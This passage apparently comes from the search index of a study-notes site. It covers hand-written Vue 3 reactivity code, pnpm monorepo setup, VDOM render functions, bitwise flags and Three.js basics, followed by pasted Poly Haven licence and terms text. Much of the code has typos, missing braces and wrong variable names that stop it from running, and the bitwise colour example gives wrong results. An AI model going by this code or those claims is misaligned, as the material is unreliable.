vu3 \u4e2d\u5355\u5143\u6d4b\u8bd5\u548c\u670d\u52a1\u7aef\u6e32\u67d3</p> <p>1.\u58f0\u660e\u5f0f\u7f16\u7a0b</p> <p>```js \"chainDataProcess\" const chainDataProcess = (str) =&gt;   str     .toLowerCase()     .split('')     .map(\u00a9 =&gt; c.trim())     .reverse()     .filter((x) =&gt; x.length &gt; 3)     .join('') <pre><code>```js \"impreativeDataProcess\"\nconst imperativeDataProcess = (str) =&gt; {\n  const lower = str.toLowerCase()\n  const words = lower.split('')\n  for (let i in words) {\n    words[i] = words[i].trim()\n  }\n  words.reverse()\n  let keepers = []\n  for (let i in words) {\n    if (words[i].length &gt; 3) {\n      keepers.push(words[i])\n    }\n  }\n  return keepers.join('')\n}\n</code></pre></p> <p>```js \"composeDataProce\" function compose(...fns){   if(fns.length === 0) return input =&gt; input   if(fns.length === 1) return input =&gt; head(fns)input }   return function(input){     return compose(...tail(fns))(head(fns)(input))   } function head(arr){   return arr[0] }</p> <p>function tail(arr){   return arr.slice(1) } function desnake(snake_case_string){   return snake_case_string.split('_') } function capFirst(str){   if(str.length &lt; 1) return   return str.charAt(0).toUpperCase + str.substring(1).toLowerCase() }</p> <p>function capAll(strArr){   return strArr.map(str =&gt; capFirst(str)) } function camelize(strArr){     return [head(strArr)].concat(capAll(tail(strArr))).join('') }</p> <p>function hyphenate(strArr){   return [head(strArr)].concate(tail(strArr).join('-')) }</p> <p>const snakeToCamel = compose(desnake, camlize) const snakeToKabab = compose(desnake, hyphenate) <pre><code>```js \"curry\"\nfunction I18n(greeting) {\n  return function (name) {\n    return [greeting, name + '!'].join(' ')\n  }\n}\nconst greetItal = I18n('Ciao')\nconst greetFren = I18n('Bonjour')\nconst greetSpan = I18n('Hola')\n\n/*========== Test Case ==========*/\ngreetItal('Hammond') // Ciao Hammond!\ngreetFren('Hammond') // Bonjour Hammond!\ngreetSpan('Hammond') // Hola Hammond!\n</code></pre></p>"},{"location":"vue/hands-on-reactivity/#2-dom","title":"2.\u91c7\u7528\u865a\u62df DOM","text":"<pre><code>const ulEl = document.querySelector('tbody')\nxhr.onload = function () {\n  const data = JSON.parase(xhr.responseText)\n  ulEl.innerHtml = data.result.permissions.map((permission) =&gt; {\n    return `\n            &lt;l&gt;${permission}&lt;li&gt;\n    `\n  })\n}\n</code></pre>"},{"location":"vue/hands-on-reactivity/#monroepo","title":"Monroepo \u7ba1\u7406\u9879\u76ee","text":"<p>vue \u5206\u5305\u7ba1\u7406</p> <p>vue \u540c\u4e00\u4e2a repo(\u4ed3\u5e93)package(\u5206\u5305)\u7ba1\u7406</p> <pre><code>cd core\ntree -d packages/ -L 1\n</code></pre> <p>```\"core/packages/\" packages/ \u251c\u2500\u2500 compiler-core #\u5e73\u53f0\u65e0\u5173\u7f16\u8bd1\u6838\u5fc3 \u251c\u2500\u2500 compiler-dom # \u9488\u5bf9\u6d4f\u89c8\u5668\u7684\u7f16\u8bd1\u6a21\u5757 \u251c\u2500\u2500 compiler-sfc # \u9488\u5bf9\u5355\u6587\u4ef6\u89e3\u6790 \u251c\u2500\u2500 compiler-ssr # \u9488\u5bf9\u670d\u52a1\u7aef\u6e32\u67d3\u7684\u7f16\u8bd1\u6a21\u5757 \u251c\u2500\u2500 dts-built-test # \u251c\u2500\u2500 dts-test \u251c\u2500\u2500 reactivity # \u54cd\u5e94\u5f0f\u7cfb\u7edf \u251c\u2500\u2500 runtime-core \u251c\u2500\u2500 runtime-dom \u251c\u2500\u2500 runtime-test \u251c\u2500\u2500 server-renderer #\u7528\u4e8e\u670d\u52a1\u7aef\u6e32\u67d3 \u251c\u2500\u2500 sfc-playground \u251c\u2500\u2500 shared # \u591a\u5305\u5171\u4eab \u251c\u2500\u2500 template-explorer # \u8c03\u8bd5\u7f16\u8bd1\u5668\u8f93\u51fa\u7684\u5f00\u53d1\u5de5\u5177 \u251c\u2500\u2500 vue # \u5b8c\u6574\u7248\u672c,\u5305\u62ec\u8fd0\u884c\u65f6\u548c\u7f16\u8bd1\u65f6 \u2514\u2500\u2500 vue-compat # \u8fc1\u79fb\u6784\u5efa,\u7528\u4e8e\u517c\u5bb9vue2 <pre><code>**\u6253\u5305\u4ea7\u7269**\n\n```\"package.json\"\n{\n    \"scirpts\": {\n        \"dev\": \"node scripts/dev.js reactivity -f esm\"\n    }\n}\n</code></pre></p> <p>\u6253\u5305\u683c\u5f0f</p> <pre><code>tree  node_modules/@vue/reactivity/dist -L 1\n\nnode_modules/@vue/reactivity/dist\n\u251c\u2500\u2500 reactivity.cjs.js\n\u251c\u2500\u2500 reactivity.esm-browser.js\n\u251c\u2500\u2500 reactivity.esm-bundler.js\n\u251c\u2500\u2500 reactivity.global.js\n\u251c\u2500\u2500 reactivity.cjs.prod.js\n\u251c\u2500\u2500 reactivity.esm-browser.prod.js\n\u251c\u2500\u2500 reactivity.d.ts\n\u2514\u2500\u2500 reactivity.global.prod.js\n</code></pre>"},{"location":"vue/hands-on-reactivity/#1-pnpm","title":"1. \u5168\u5c40\u5b89\u88c5 pnpm","text":"<pre><code>npm install pnpm -g\npnpm -init\n</code></pre> <p>```\".npmrc\" shamefully-hoist = true # vue \u4f9d\u8d56\u7684\u5305\u63d0\u5347\u5230 node_moduels root import {} from '@vue/reactivity' // \u5e7d\u7075\u4f9d\u8d56 <pre><code>```\".npmrc\"\nshamefully-hoist = false # default\n\n`pnpm install @vue/reactivity -w`\nimport {} from '@vue/reactivity'\n</code></pre></p> <p>```\"pacakage.json\" {     name: \"monorepo-test\"     private: true, } <pre><code>```yaml \"pnpm-wrokspace.yaml\"\n// root/main/base project\n//  - packages:\n//      - subProject1\n//      - subProject2\npackages:\n    - \"packages/*\"\n</code></pre></p> <p>add vue dependency to workspace root</p> <pre><code>pnpm install vue --workspace-root\n</code></pre> <p>\u9879\u76ee\u5206\u5305\u5165\u53e3</p> <p>typescript \u914d\u7f6e</p> <pre><code>- packages\n -reactivity\n    - src\n        -index.ts\n\n`pnpm install typescript -w`\npnpm tsc --init\n</code></pre> <p>```json \"tsconf.json\" {   \"compilerOptions\": {     \"outDir\": \"dist\",     \"sourceMap\": true,     \"target\": \"es2016\",     \"module\": \"esnext\",     \"moduleResolution\": \"node\",     \"strict\": false,     \"resolveJsonModule\": true,     \"esModuleInterop\": true,     \"jsx\": \"preserve\",     \"lib\": [\"esnext\", \"dom\"],     \"baseUrl\": \".\", // \u914d\u7f6e\u6587\u4ef6\u6240\u5728\u76ee\u5f55     \"paths\": {       \"@vue/\": [\"packages//src\"] // modudle specifier \u89e3\u6790     }   } } <pre><code>```yaml\n- packages\n  - reactivity\n  - src\n  - index.ts\n  - shared\n  - src\n  - index.ts\n</code></pre></p> <p>\u4f5c\u7528\u57df\u5305\u907f\u514d\u5305\u53d1\u5e03\u51b2\u7a81</p> <p>```json \"package.json\" {   \"name\": \"@vue/ractivity\" } <pre><code>```json \"package.json\"\n{\n  \"name\": \"@vue/shaed\"\n}\n</code></pre></p> <p>\u5f15\u5165\u5206\u5305</p> <pre><code>pnpm install @vue/shared@workspace --filter @vue/reactivity\n</code></pre> <p>```\"package.json\" \"dependencies\": {     \"@vue/shared\": \"workspace:^\"  } <pre><code>```json \"tsconfig.json\"\n{\n  \"baseUrl\": \".\", //\u5728\u5f53\u524d\u914d\u7f6e\u6587\u4ef6\u4f5c\u5728\u76ee\u5f55\n  \"paths\": {\n    \"@vue/*\": [\"packages/*/src\"]\n  }\n}\n</code></pre></p>"},{"location":"vue/hands-on-reactivity/#_1","title":"\u5f00\u53d1\u73af\u5883\u642d\u5efa","text":""},{"location":"vue/hands-on-reactivity/#effect-reactive","title":"\u624b\u5199 effect \u548c reactive","text":"<pre><code>{\n  \"id\": 1,\n  \"subject\": \"hands on vue \",\n  \"dueDate\": {\n    \"DateTime\": \"2016-04-25T07:00:00.0000000\",\n    \"TimeZone\": \"UTC\"\n  },\n  \"priority\": \"High\",\n  \"completed\": false \n}\n</code></pre> reactive.ts<pre><code>import { isObject } from '@vue/shared'\n\nimport { ReactiveFlags, mutableHandlers } from './baseHandler'\n\nexport function reactive(target) {\n  return createReactiveObject(target)\n}\n\nconst reactiveMap = new WeakMap()\n\nfunction createReactiveObject(target) {\n  if (!isObject(target)) {\n    return\n  }\n  if (target[ReactiveFlags.IS_REACTIVE]) {\n    return target\n  }\n  // \u9632\u6b62\u540c\u4e00\u4e2a\u5bf9\u8c61\u88ab\u4ee3\u7406\u4e24\u6b21, \u8fd4\u56de\u7684\u6c38\u8fdc\u662f\u540c\u4e00\u4e2a\u4ee3\u7406\n  let existingProxy = reactiveMap.has(target)\n  if (existingProxy) {\n    return reactiveMap.get(target)\n  }\n\n  const porxy = new Proxy(target, mutableHandlers)\n  reactiveMap.set(target, proxy)\n\n  return proxy\n}\n</code></pre> index.html<pre><code>&lt;body&gt;\n  &lt;div class=\"app\"&gt;&lt;/div&gt;\n\n  &lt;script&gt;\n    /*========= Test Code ===========*/\n    import { reactive, effect } from './reactivity.js'\n\n    const todo = {title: 'hands on vue', completed: true, flag: }\n\n    const state = reactive(todo)\n\n    effect(()=&gt;{\n      //        state.age = Math.random()\n        // flag = true, \u6536\u96c6\u7684\u4f9d\u8d56\u4e3aflag, name\n        // flag = flase, \u6536\u96c6\u7684\u4f9d\u8d56\u4e3aflag, age\n        app.innerHTML = stat.flag ?  state.title : state.completed\n        effect(()=&gt;{\n\n        })\n      }\n    )\n  &lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <pre><code>const mutableHandlers = {\n  get(target, key) {\n    track(target, key)\n    let result = Reflect.get(target,key,receiver)\n    if(isObject(result)){\n      return reactive(result)\n    }\n    return result\n  },\n  set(target, key, value, revier) {\n    console.log('\u8bbe\u7f6e\u65b0\u7684\u503c, \u89e6\u53d1\u66f4\u65b0')\n    let oldValue = target[key]\n    if (value !== oldValue) {\n      trigger(target, key, value, oldvalue)\n    }\n  },\n}\n</code></pre> effect.ts<pre><code>export activeEffect = undefined\n\nclass ReactiveEffect {\n    parent = undefined;\n    constructor(fn, scheduler){}\n\n  run(){\n    try{\n      this.parent = activeEffect\n      activeEffect = this\n      return this.fn()\n    }finally {\n      activeEffect = this.parent\n      this.parent = undefined\n    }\n  }\n}\n\n\n\nexport function effect(fn, options = {}){\n  const _effect = new ReactiveEffect(fn, options.scheduler)\n  _effect.run()\n  const runner = _effect.run.bind(_effect)\n  return runner \n}\n</code></pre> <pre><code>function trigger(target, key, value, oldvalue) {\n  // \u627e\u5230effect\u7136\u540e\u6267\u884c\n  const depsMap = targetMap.get(target)\n  if (!depsMap) {\n    // \u4efb\u4f55\u5b57\u6bb5\u7684effect\u90fd\u6ca1\u6709\n    return\n  }\n  const effects = depsMap.get(key)\n\n  if (effects) {\n    effects.forEach((effect) =&gt; {\n      // \u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u548c\u73b0\u5728\u8981\u6267\u884c\u7684\u662f\u7528\u4e00\u4e2a\u5c31\u5c4f\u853d\u6389\n      if (activeEffect !== effect){\n        if(effect.scheduler){\n          effect.scheduler()\n        }else {\n          effect.run()\n        }\n      } \n    })\n  }\n}\n</code></pre> <p>\u4f9d\u8d56\u6536\u96c6\u539f\u7406</p> <p></p> <p>todo = {title: 'hands on vue', completed: 'false'}</p> <p>const targetMap = {</p> <p>todo: {</p> <p>title: [effect1, effect2], \u200b completed: [effect1, effect3]</p> <p>}</p> <pre><code>function track(target, key){\n  let depsMap = targetMap.get(target)\n    if(!depsMap){\n    targetMap.set(target,(depsMap = new WeakMap())\n  }\n    let effects = depsMap.get(key)\n  if(!effects){\n        depsMap.set(key, (effects = new Set()) )\n  }\n  let shouldTrack = !effects.has(effect)\n  if(shouldTrack){\n    effects.add(activeEffect)\n    activeEffect.deps.push(effects)\n  }\n}\n}\n</code></pre> <ul> <li> \u5f02\u6b65\u6279\u91cf\u66f4\u65b0</li> </ul> index.html<pre><code>/*======= Effect Test code =========*/\n&lt;body&gt;\n  &lt;script&gt;\n    const runner = effect(\n      () =&gt; {\n        app.innerHtml = state.title\n      },\n      {\n        scheduler() {\n          if (!isFlushing) {\n            Promise.resolve().then(() =&gt; {\n              runner()\n              isFLushing = false\n            })\n          }\n          isFlushing = true\n        },\n      }\n    )\n  &lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <ul> <li> \u6761\u4ef6\u6536\u96c6, \u6e05\u7a7a\u4e0a\u6b21\u4f9d\u8d56\u6536\u96c6</li> </ul> <pre><code>effect(()=&gt;{\n  app.innerHTML = todo.id ? todo.priority : todo.subject \n})\n</code></pre> <ul> <li> \u6df1\u5ea6\u61d2\u4ee3\u7406</li> </ul> <pre><code>effect(()=&gt;{\n  app.innerHTML = todo.dueDate.dateTime\n</code></pre>"},{"location":"vue/hands-on-reactivity/#ref-torefs-toref-toraw-proxyrefs","title":"ref, toRefs, toRef, toRaw, proxyRefs","text":"<p>``` ts ref.ts</p> <p>function proxyRefs(target){   return new Proxy(target,{     get(target, key, receiver){        let r = Reflect.get(target.key,receiver){        return  r.__v_isRef ? r.value : r       },       set(target, key, value, receiver){                 const oldValue = target[key];         if(oldValue.__v_isRef){           oldValue.value = value           return         } else {           return Reflect.set(target, key, value, receiver)         }</p> <pre><code>    }\n}\n</code></pre> <p>}) }</p> <p>```</p>"},{"location":"vue/mini-pinia/","title":"Mini pinia","text":"<ul> <li>pinia\u4f53\u9a8c\u548c\u8bbe\u8ba1\u7406\u5ff5</li> <li>pinia\u6e90\u7801\u5256\u6790</li> <li>\u624b\u5199pinia</li> </ul>"},{"location":"vue/runtime-vue/","title":"Runtime vue","text":"<pre><code>Object.prototype.toString.call({})// '[object Object]'\nObject.prototype.toString.call(new Set()) // '[object Set]'\nObject.prototype.toString.call(new Map())// '[object Map]'\n\n\nconst enum TargetType {\n  INVALID = 0,\n  COMMON = 1,\n  COLLECTION = 2\n}\n\n\nfunction targetTypeMap(rawType: string){\n  switch (rawType) {\n    case 'Object':\n    case 'Array':\n      return TargetType.COMMON\n    case 'Map':\n    case 'Set':\n    case \"WeakMap\":\n    case \"WeakSet\":\n      return TargetType.COLLECTION\n    default: \n      return TargetType.INVALID\n  }\n}\n</code></pre> <pre><code>// length-altering mutation methods to avoid length being tracked\n(['push','pop','shift','unshift', 'splice']) as const\n</code></pre>"},{"location":"vue/runtime-vue/#vdom","title":"VDOM","text":"<p>Vue 2 API</p> <pre><code>render(h){\n  return h('div',{\n    attrs: {\n      id: 'foo'\n    },\n    on: {\n      click: this.onClick\n    }\n  }, 'hello')\n}\n</code></pre> <p>Vue 3 API</p> <ul> <li>Flat props Structure</li> <li>Globally imported <code>h</code> helper</li> </ul> <pre><code>render(h){\n    return h('div',{\n    id: 'foo',\n    onClick: this.onClick\n  }, 'hello')\n}\n</code></pre> <ul> <li> slot</li> </ul> <pre><code>render(){\n  const slot = this.$slots.default\n        ? this.$slots.default()\n    : []\n    return h('div',{class: 'stack'}, slot.map(child=&gt;{\n    return h('div', { class: `mt-${this.$props.size}`}, [child])\n  }))\n}\n</code></pre> <ul> <li> v-if</li> </ul> <pre><code>render(){\n  let nodoToReturn\n  nodeToReturn = this.firstConditon\n    ? h('div', { id: 'hello' }, [h('span', 'world')])\n    : this.otherCondition\n        ? h('p', 'other branch')\n        : h('span')\n}\n</code></pre> <ul> <li> v-for</li> </ul> <pre><code>render(){\n  return this.list.map(item =&gt; {\n    return h('div', { key: item.id }, item.text )\n  })\n}\n</code></pre> <pre><code>function mount(vnode, container){\n  const el = vnode.el = document.createElement(vnode.tag)\n  for(const key in vnode.props){\n    const value = vnode.props[key]\n    if(key.startsWith('on')){\n      el.addEventListener(key.slice(2).toLowerCase())\n    } else {\n      el.setAttribute(key, value)\n    }\n  }\n\n  if (vnode.children){\n    if(typeof vnode.children === 'string'){\n      el.textContent = vnode.children\n    } else {\n      vnode.children.forEach(child =&gt; {\n        mount(child, el)\n      })\n    }\n  }\n  container.appendChild(el)\n}\n</code></pre> <pre><code>function normalizeStyle(el, prevValue, nextValue) {\n  // {style:{color:red}} -&gt; {style: {backgroundColor: 'red'}}\n  const style = el['style']\n  for (const key in nextValue){\n    style[key] = newxValue[key]\n  }\n  for (const key in preValue) {\n    if(!nextValue[key]){\n            style[key] = null\n    }\n  }\n\n}\n</code></pre>"},{"location":"vue/runtime-vue/#bitwise-flags","title":"bitwise flags","text":"<p><pre><code>BINARY DECIMAL COLOR\n------ ------- -----\n   001       1  Red\n   010       2  Green\n   011       3  Red+Green\n   100       4  Blue\n   101       5  Blue+Red\n   110       6  Blue+Green\n   111       7  Blue+Green+Red\n\n```ts\n    enum Color {\n        Red = 1 &lt;&lt; 0\n        Green = 1 &lt;&lt; 1\n        Bule = 1 &lt;&lt; 2\n    }\n\n```\n</code></pre> - [x] composable</p> <pre><code>Color purple = Red | Blue\nColor yellow = Green | Blue \n</code></pre> <ul> <li> find intersection  or membership</li> </ul> <pre><code>const hasRed =  !!(purple &amp; Red)  // false\nconst hasGreen = !!(purple &amp; Green) // false\nconst iestColor = purple &amp; yellow // blue\n</code></pre> <pre><code>const PermissionExecute = 1 &lt;&lt; 0\nconst PermissionRead = 1 &lt;&lt; 1\nconst PermissionWrite = 1 &lt;&lt; 2\n\nconst PermissionAll = PermissionExecute | PermissionRead | PermissionWrite\n\nclass PermissionManager {\n  constructor(){\n    this.permissions = 0\n  }\n  set(flag){\n    this.permissions |=  flag \n  }\n  clear(flag){\n    this.permissions &amp;= ~flag \n  }\n  hasAll(flag) {\n    return (this.permissions &amp; flag) === flag\n  }\n  hasOneOf(flag){\n    return (this.permissions &amp; flag) !== 0\n  }\n}\n\n\n/*========== Test Code ========*/\n const manager = new PermissionManager();\n\n    // \u8bbe\u7f6e\u6240\u6709\u6743\u9650\n    manager.set(PermissionAll);\n\n    // \u6e05\u9664\u8bfb\u53d6\u6743\u9650\n    manager.clear(PermissionRead);\n\n    // \u68c0\u67e5\u662f\u5426\u540c\u65f6\u5177\u6709\u6267\u884c\u548c\u8bfb\u53d6\u6743\u9650\n    const hasExecuteAndRead = manager.hasAll(PermissionExecute | PermissionRead);\n\n    // \u68c0\u67e5\u662f\u5426\u540c\u65f6\u5177\u6709\u6267\u884c\u548c\u5199\u5165\u6743\u9650\n    const hasExecuteAndWrite = manager.hasAll(PermissionExecute | PermissionWrite);\n</code></pre> <pre><code>export const enum ShapeFlags {\n  ELEMENT = 1,\n  FUNCTIONAL_COMPONENT = 1 &lt;&lt; 1,\n  STATEFUL_COMPONENT = 1 &lt;&lt; 2,\n  TEXT_CHILDREN = 1 &lt;&lt; 3,\n  ARRAY_CHILDREN = 1 &lt;&lt; 4,\n  SLOTS_CHILDREN = 1 &lt;&lt; 5,\n  TELEPROT = 1 &lt;&lt; 6,\n  SUSPENT = 1 &lt;&lt; 7,\n  COMPONENT_SHOULD_KEEP_ALIVE = 1 &lt;&lt; 8,\n  COMPONENT_KEPT_ALIVE = 1 &lt;&lt; 9,\n  COMPONENT = ShapeFlags.STATEFUL_COMPONENT | ShapeFlags.FUNCTIONAL_COMPONENT\n}\n</code></pre>"},{"location":"vue/runtime-vue/#built-in-component","title":"built-in component","text":""},{"location":"webGL/","title":"Graphics programming","text":"<p>it's not drawing/painting with the computer</p> <p>it's modeling and rendering</p> <p></p>"},{"location":"webGL/#what-do-we-need-to-model-in-order-to-render-these-graphical-images","title":"What do we need to model in order to render these graphical images?","text":""},{"location":"webGL/#maths-underline-those-pretty-pictures","title":"maths underline those pretty pictures","text":"<ul> <li>algebra \uff08\u4ee3\u6570\uff09</li> <li>geometry \uff08\u51e0\u4f55\u5b66\uff09</li> <li>trigonometry (\u4e09\u89d2\u5b66)</li> <li>calculus (\u5fae\u79ef\u5206)</li> <li>some linear algebra \uff08\u4e00\u4e9b\u7ebf\u6027\u4ee3\u6570\uff09</li> </ul>"},{"location":"webGL/#rasing-concepts","title":"rasing concepts","text":"<ul> <li>vertices \u9876\u70b9</li> <li>camera position  \u76f8\u673a\u4f4d\u7f6e</li> <li>camera direction  \u76f8\u673a\u65b9\u5411</li> <li>image plane  \u50cf\u5e73\u9762</li> <li>projection \u6295\u5f71</li> <li>reflection  \u53cd\u5c04</li> <li>color  \u989c\u8272</li> </ul> <p>These are the fundamental concepts of computer graphics: \u8fd9\u4e9b\u662f\u8ba1\u7b97\u673a\u56fe\u5f62\u5b66\u7684\u57fa\u672c\u6982\u5ff5\uff1a</p> <ul> <li>Object modeling \u5bf9\u8c61\u5efa\u6a21</li> <li>Camera placement and shape of viewed region   \u76f8\u673a\u4f4d\u7f6e\u548c\u89c2\u5bdf\u533a\u57df\u7684\u5f62\u72b6</li> <li>Material  \u6750\u6599</li> <li>Lighting  \u706f\u5149</li> <li>Texture mapping  \u7eb9\u7406\u6620\u5c04</li> <li>Modeling curves and surfaces   \u66f2\u7ebf\u548c\u66f2\u9762\u5efa\u6a21</li> <li>Animation  \u52a8\u753b\u7247</li> </ul>"},{"location":"webGL/#the-graphic-render-pipeline","title":"the graphic render pipeline","text":"<p>Our software is going to construct a 3D model of our object or scene, typically as a collection of vertices, faces, surfaces, control points, and the like. These will be sent to the graphics card, which will render the scene as a raster image of pixels. These are written into the frame buffer, where they stay in order to drive the display.</p> <p></p> <p></p>"},{"location":"webGL/#before-we-get-started-with-graphic-programming","title":"before we get started with graphic programming","text":"<p>test whether your browser supports WebGL</p> <p>WebGL This is a standard graphics API, a subset of the full OpenGL API that is supported by most graphics cards.</p> <p>Three.js This is an API built on top of WebGL, doing a lot of the modeling and rendering for you. WebGL is still there, underneath, but we will rarely see it. Three.js is very powerful. It allows you to ignore a lot of detailed technical concepts in Computer Graphics that plain WebGL would force you to know, and the programming is far less work.</p>"},{"location":"webGL/#in-threejs-we-build-data-structures-of-vertices-and-faces","title":"In Three.js, we build data structures of vertices and faces,","text":"<ul> <li><code>triangles</code>we want surfaces, and the representation of a surface is often done by breaking it down into triangles</li> </ul> <ul> <li>Front and Back of Triangles</li> <li>Normal Vectors</li> </ul>"},{"location":"webGL/#drawing-in-threejs","title":"Drawing in Three.js","text":"<p>How do we draw stuff in Three.js? It's a two-step process: we represent something and then we render it</p> <p>Geometry </p> <p>is a structure of vertices and faces and associated geometrical information, such as the vectors that specify the orientations of faces.</p> <p>Material </p> <p>Meshes</p>"},{"location":"webGL/#building-a-geometry-from-scratch","title":"Building a Geometry From Scratchpreview of what you can achieve with Three.jsauthor and contributors of Three.js3d geometry","text":"<p>Step 1: Create a new <code>THREE.Geometry</code> object and define its vertices:</p> <p></p> <pre><code>var barnGeometry = new THREE.Geometry();\n// add vertices to the barnGeometry.vertices array -\n// indices of this array correspond to the above labels \nbarnGeometry.vertices.push(new THREE.Vector3(0, 0, 0));\nbarnGeometry.vertices.push(new THREE.Vector3(30, 0, 0));\nbarnGeometry.vertices.push(new THREE.Vector3(30, 40, 0));\n...\n</code></pre> <p>Step 2: Divide each object surface into triangular faces, and define each face using three vertex labels (indices of the <code>barnGeometry.vertices</code> array).</p> <p></p> <pre><code>// front side of each of these faces is outside the barn\nbarnGeometry.faces.push(new THREE.Face3(0, 1, 2));\nbarnGeometry.faces.push(new THREE.Face3(0, 2, 3));\nbarnGeometry.faces.push(new THREE.Face3(3, 2, 4));\n...\n</code></pre> <ul> <li> <p>https://bruno-simon.com</p> </li> <li> <p>https://richardmattka.com</p> </li> <li> <p>https://www.oculus.com/medal-of-honor/</p> </li> <li> <p>http://letsplay.ouigo.com</p> </li> <li> <p>https://zen.ly</p> </li> <li> <p>https://www.midwam.com/en/experiences</p> </li> <li> <p>oppenheimermovie.com</p> </li> <li> <p>https://chartogne-taillet.com/en</p> </li> <li> <p>https://www.bugatti.com ( a car dealership that wants users to be able to interact with a 3D model of a car on offer )</p> </li> </ul> <p></p> <p>Ricardo Cabello, aka Mr.doob (Website, Twitter), is the developer who created Three.js. He is still working on it, but now he's helped by a large community. You can check the list of contributors sadhere:https://github.com/mrdoob/three.js/graphs/contributors</p> <p>animation presenting a sequence of still images in quick enought succession, the viewer interperets them as a continuous moving </p> <p>frame rate aka <code>frame per second</code> the number of images consecutively display each second</p> <p>in 3d space, three parameters are required to find exact location of a point</p> <p>geomestry composed of vertices(\u9876\u70b9) \u548c faces(\u9762)</p> <p>vertices: vertices are points where the edges meet</p> <p><code>edges</code> egdes are lines where two faces meet</p> <p>UV</p> <ul> <li>spherical(\u7403\u9762) maps </li> <li>Cylindrical(\u67f1\u9762) maps</li> <li>planar(\u5e73\u9762) maps</li> </ul>"},{"location":"webGL/#assets-libs","title":"assets libs","text":"<ul> <li>poly haven</li> <li>HDRiHaven</li> </ul> <p>meshes(\u7f51\u683c) and particles(\u7c92\u5b50)</p> <p>npm uses <code>package.json</code> to track which versions of each dependency you've installed</p> <p>each dependecy you install is located in <code>&lt;proejct_root&gt;/node_modules</code></p> <p><code>npx</code> as <code>node package runner</code></p> <p>When executables are installed via NPM packages, NPM links to them:</p> <ol> <li>local installs have \"links\" created at <code>./node_modules/.bin/</code> directory.</li> <li>global installs have \"links\" created from the global <code>bin/</code> directory (e.g. <code>/usr/local/bin</code>) on Linux or at <code>%AppData%/npm</code> on Windows.</li> </ol> <p><code>npx</code> will check whether <code>&lt;command&gt;</code> exists in <code>$PATH</code>, or in the local project binaries<code>./node_modules/.bin/</code></p> <p>execute a executables which wasn't previously installed:</p>"},{"location":"webGL/#from-datgui-to-lil-gui","title":"From dat.GUI to lil-gui","text":"<p>creatvie project need to tweak parameter </p> <p><code>lil-gui</code> as a drop in replacement for <code>dat.GUI</code></p> <p>compatiable interface without adjustment for the code, plus missing feature</p>"},{"location":"webGL/#cc0-license","title":"CC0 License","text":"<ul> <li>You can use our assets for any purpose, including commercial work.</li> <li>You do not need to give credit or attribution when using them (although it is appreciated).</li> <li>You can redistribute them, share them around, include them when sharing your own work, or even in a product you sell.</li> </ul> <p>The licensor cannot revoke these freedoms as long as you follow the license terms.</p> <p></p> <ol> <li> <p>CMU 15-462/15-662 \u21a9</p> </li> <li> <p>Learning Modern 3D Graphics Programming \u21a9</p> </li> </ol>"},{"location":"webGL/#asset-license","title":"Asset License","text":"<p>All assets (HDRIs, textures and 3D models) on this site are the original work of Poly Haven staff, or artists who willingly and directly donate/sell their work to Poly Haven.</p> <p>Our assets are all licensed as CC0, which is effectively Public Domain even in jurisdictions that do not support the Public Domain.</p> <p>Here's an excerpt from the CC0 FAQ page to clarify:</p> <p>Once the creator or a subsequent owner of a work applies CC0 to a work, the work is no longer his or hers in any meaningful sense under copyright law. Anyone can then use the work in any way and for any purpose, including commercial purposes [...] Think of CC0 as the \"no rights reserved\" option. CC0 is a useful tool for clarifying that you do not claim copyright in a work anywhere in the world.</p> <p>In other words:</p> <ul> <li>You can use our assets for any purpose, including commercial work.</li> <li>You do not need to give credit or attribution when using them (although it is appreciated).</li> <li>You can redistribute them, share them around, include them when sharing your own work, or even in a product you sell.</li> </ul> <p>More info: CC0 summary, CC0 wiki, CC0 FAQ.</p>"},{"location":"webGL/#why-cc0","title":"Why CC0?","text":"<p>We believe the benefits of using this license outweigh the obvious drawbacks for us as a business.</p> <p>Yes it's possible that unethical users can (and do) resell our work for their own profit, at the cost of unwitting customers who didn't know they were purchasing content they could get here for free.</p> <p>But what the 3D industry as a whole gains from our work being so freely available is immeasurable</p> <p>3D art is also only the tip of the iceberg, we've heard from numerous data scientists, software developers, automotive engineers and AI researchers all using our assets in their work, which simply wouldn't be possible with more restrictive (even open source) licenses.</p> <p>We don't have anything against Copyright in general, we simply believe we can do more good in the world by providing as much freedom as possible.</p> <p>If you benefit from our work financially, e.g. by including our assets in a product you sell, or simply make frequent use of them in your own work, please consider supporting us on Patreon with a small monthly donation in order to help us continue to produce more assets and maintain this platform.</p>"},{"location":"webGL/#terms-of-service","title":"Terms of Service","text":"<p>Although our assets are shared under the CC0 license, and our code is open source, we maintain a standard Terms of Service agreement to prevent any misuse of this website (polyhaven.com).</p>"},{"location":"webGL/#1-acceptance-of-terms","title":"1. Acceptance of Terms","text":"<p>By using this website, you agree to be bound by these Terms of Service (ToS). If you do not agree with any of these terms, please refrain from using this website.</p>"},{"location":"webGL/#2-changes-to-terms","title":"2. Changes to Terms","text":"<p>We reserve the right to modify these ToS at any time. It is your responsibility to review these terms periodically for any changes. Your continued use of the website after any changes to the ToS constitutes your acceptance of those changes.</p>"},{"location":"webGL/#3-use-of-the-website","title":"3. Use of the Website","text":"<p>3.1. You agree to use this website for lawful purposes only.</p> <p>3.2. You must not engage in any activity that may disrupt or interfere with the proper functioning of the website, including but not limited to:</p> <ul> <li>Web scraping or data mining without express permission.</li> <li>Distributed denial-of-service (DDoS) attacks.</li> <li>Unauthorized access to website resources or user accounts.</li> <li>Posting malicious code, malware, or any harmful content.</li> <li>Engaging in any form of harassment or abuse towards other users.</li> </ul>"},{"location":"webGL/#4-intellectual-property","title":"4. Intellectual Property","text":"<p>4.1. All content on this website, excluding the CC0 assets themselves, is protected by intellectual property laws. You may not reproduce, distribute, or otherwise use this content without prior written permission from the website or intellectual property owner.</p> <p>4.2. Examples of such content includes but is not limited to:</p> <ul> <li>Logos</li> <li>User avatar images</li> <li>Asset thumbnails and example renders</li> <li>User renders</li> <li>Text</li> <li>Asset metadata such as tags and categories</li> </ul>"},{"location":"webGL/#5-public-api","title":"5. Public API","text":"<p>The use of the public API hosted at api.polyhaven.com is governed by separate API Terms. By using the public API, you agree to abide by the API Terms in addition to these Terms of Service.</p>"},{"location":"webGL/#6-privacy","title":"6. Privacy","text":"<p>Your use of this website is also governed by our Privacy Policy. By using this website, you consent to the collection, use, and disclosure of your information as described in the Privacy Policy.</p>"},{"location":"webGL/#7-termination","title":"7. Termination","text":"<p>We reserve the right to terminate or suspend your access to the website at our discretion, without notice, for any breach of these ToS or for any other 